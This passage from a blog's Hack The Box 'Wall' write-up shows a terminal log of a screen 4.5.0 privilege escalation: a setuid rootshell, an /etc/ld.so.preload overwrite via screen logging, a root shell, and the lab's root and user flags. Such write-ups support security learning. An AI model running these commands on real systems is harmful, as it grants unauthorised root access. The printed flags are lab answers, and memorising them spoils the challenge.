+<span class="code-line"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">rootshell</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">5</span><span class="err">:</span><span class="mi">5</span><span class="err">:</span><span class="w"> </span><span class="nl">warning</span><span class="p">:</span><span class="w"> </span><span class="n">implicit</span><span class="w"> </span><span class="n">declaration</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="s1">&#39;seteuid&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">mean</span><span class="w"> </span><span class="s1">&#39;setbuf&#39;</span><span class="vm">?</span><span class="w"> </span><span class="o">[</span><span class="n">-Wimplicit-function-declaration</span><span class="o">]</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="o">^~~~~~~</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="n">setbuf</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">rootshell</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">6</span><span class="err">:</span><span class="mi">5</span><span class="err">:</span><span class="w"> </span><span class="nl">warning</span><span class="p">:</span><span class="w"> </span><span class="n">implicit</span><span class="w"> </span><span class="n">declaration</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="s1">&#39;setegid&#39;</span><span class="w"> </span><span class="o">[</span><span class="n">-Wimplicit-function-declaration</span><span class="o">]</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="o">^~~~~~~</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">rootshell</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">7</span><span class="err">:</span><span class="mi">5</span><span class="err">:</span><span class="w"> </span><span class="nl">warning</span><span class="p">:</span><span class="w"> </span><span class="n">implicit</span><span class="w"> </span><span class="n">declaration</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="s1">&#39;execvp&#39;</span><span class="w"> </span><span class="o">[</span><span class="n">-Wimplicit-function-declaration</span><span class="o">]</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="n">execvp</span><span class="p">(</span><span class="ss">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">);</span><span class="w"></span></span>
+<span class="code-line"><span class="w">     </span><span class="o">^~~~~~</span><span class="w"></span></span>
+<span class="code-line"><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@Wall</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="w"></span></span>
+<span class="code-line"><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="w"></span></span>
+<span class="code-line"><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@Wall</span><span class="err">:</span><span class="o">/</span><span class="n">etc</span><span class="err">$</span><span class="w"> </span><span class="n">umask</span><span class="w"> </span><span class="mi">000</span><span class="w"></span></span>
+<span class="code-line"><span class="n">umask</span><span class="w"> </span><span class="mi">000</span><span class="w"></span></span>
+<span class="code-line"><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@Wall</span><span class="err">:</span><span class="o">/</span><span class="n">etc</span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">screen</span><span class="o">-</span><span class="mf">4.5.0</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="n">ld</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">preload</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">ne</span><span class="w">  </span><span class="ss">&quot;\x0a/tmp/ioio/libhax.so&quot;</span><span class="w"> </span></span>
+<span class="code-line"><span class="o">&lt;</span><span class="w"> </span><span class="n">ld</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">preload</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">ne</span><span class="w">  </span><span class="ss">&quot;\x0a/tmp/ioio/libhax.so&quot;</span><span class="w"> </span></span>
+<span class="code-line"><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@Wall</span><span class="err">:</span><span class="o">/</span><span class="n">etc</span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">screen</span><span class="o">-</span><span class="mf">4.5.0</span><span class="w"> </span><span class="o">-</span><span class="n">ls</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">screen</span><span class="o">-</span><span class="mf">4.5.0</span><span class="w"> </span><span class="o">-</span><span class="n">ls</span><span class="w"></span></span>
+<span class="code-line"><span class="err">&#39;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ld</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">preload</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">preloaded</span><span class="w"> </span><span class="p">(</span><span class="n">cannot</span><span class="w"> </span><span class="k">open</span><span class="w"> </span><span class="n">shared</span><span class="w"> </span><span class="k">object</span><span class="w"> </span><span class="k">file</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="n">ignored</span><span class="p">.</span><span class="w"></span></span>
+<span class="code-line"><span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">done</span><span class="err">!</span><span class="w"></span></span>
+<span class="code-line"><span class="k">No</span><span class="w"> </span><span class="n">Sockets</span><span class="w"> </span><span class="k">found</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">screens</span><span class="o">/</span><span class="n">S</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="p">.</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@Wall</span><span class="err">:</span><span class="o">/</span><span class="n">etc</span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">rootshell</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ioio</span><span class="o">/</span><span class="n">rootshell</span><span class="w"></span></span>
+<span class="code-line"><span class="n">id</span><span class="w"></span></span>
+<span class="code-line"><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">),</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="p">),</span><span class="mi">6000</span><span class="p">(</span><span class="n">centreon</span><span class="p">)</span><span class="w"></span></span>
+</pre></div>
+
+
+<p>We got a root shell, we get the root flag and then the user flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span>cat /root/root.txt</span>
+<span class="code-line">1fdbcf8c33eaa2599afdc52e1b4d5db7</span>
+<span class="code-line">ls /hom/e</span>
+<span class="code-line">ls: cannot access &#39;/hom/e&#39;: No such file or directory</span>
+<span class="code-line">ls /hom/e</span>
+<span class="code-line">ls: cannot access &#39;/hom/e&#39;: No such file or directory</span>
+<span class="code-line">ls /home/</span>
+<span class="code-line">shelby</span>
+<span class="code-line">sysmonitor</span>
+<span class="code-line">ls /home/shelby/</span>
+<span class="code-line">html.zip</span>
+<span class="code-line">user.txt</span>
+<span class="code-line">cat /home/shelby/user.txt</span>
+<span class="code-line">fe6194544f452f62dc905b12f8da8406</span>
+</pre></div>
+
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>This box was a pain. This is the first box where a bruteforce is needed. This
+lead to high instability of the box on public servers. The blocked characters on
+the centreon payload complicate a lot the use of the CVE-2019-13024 exploit.</p>
+<p>The root part is quit easy in comparison and interesting to use.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="https://maggick.fr/2019/12/htb-heist.html"> HTB: Heist </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = "matthieukeller";
+        var disqus_identifier = "2020/12/htb-wall.html";
+
+        (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/smb.html">smb</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/ctf.html">ctf</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/waf.html">WAF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/screen.html">screen</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/hash.html">hash</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/server.html">server</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mail.html">mail</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/leak.html">leak</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/cve.html">cve</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/drupal.html">drupal</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/code-review.html">code review</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/procdump.html">procdump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
